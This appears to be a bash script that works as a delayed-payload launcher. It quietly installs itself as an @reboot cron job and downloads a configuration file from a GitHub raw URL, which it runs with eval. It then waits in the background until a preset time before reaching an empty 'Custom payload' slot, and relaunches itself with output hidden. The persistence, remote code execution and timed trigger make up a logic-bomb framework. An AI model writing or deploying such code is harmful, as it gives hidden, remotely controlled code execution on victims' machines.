#!/bin/bash

# Determine the directory where the script is located
script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Check if the cron job is already added
if ! crontab -l | grep -q "$script_dir/script.sh"; then
    # Add the @reboot cron job to the user's crontab
    (crontab -l ; echo "@reboot bash $script_dir/script.sh >/dev/null 2>&1") | crontab -
fi

# Directory to store the last configuration file
config_dir="$script_dir/config_directory"
# Ensure the directory exists
mkdir -p "$config_dir"
# Last configuration file path
last_config_file="$config_dir/last_config.txt"

# Fetch the remote configuration file from GitHub
config_url="https://raw.githubusercontent.com/raf181/Config/main/time-deploy/config.cfg"
remote_config=$(curl -s "$config_url")
# Store the fetched configuration in the last config file
echo "$remote_config" > "$last_config_file"
# Load configuration from the fetched content
eval "$remote_config"

# Convert the predetermined date and time to epoch timestamp
predetermined_epoch=$(date -d "$predetermined_datetime" +"%s")

# Loop to check the current time against the predetermined time
while true; do
    current_epoch=$(date +"%s")
    # Compare current time with predetermined time
    if [ "$current_epoch" -ge "$predetermined_epoch" ]; then
        # ================================== #
        # Custom payload: ex
        # [#] 
        #
        # ================================== #
        break
    fi

    # Check if recheck is enabled
    if [ "$recheck_enabled" = "true" ]; then
        # Wait for the specified interval before checking again
        sleep "$check_interval_seconds"
    else
        # Load the last configuration if recheck is disabled
        last_config=$(cat "$last_config_file")
        eval "$last_config"
        
        echo "Recheck is disabled. Using the last configuration. Exiting."
        break
    fi
done &  # Run the loop in the background

# Detach the script from the terminal using 'nohup'
nohup bash "$script_dir/script.sh" >/dev/null 2>&1 &
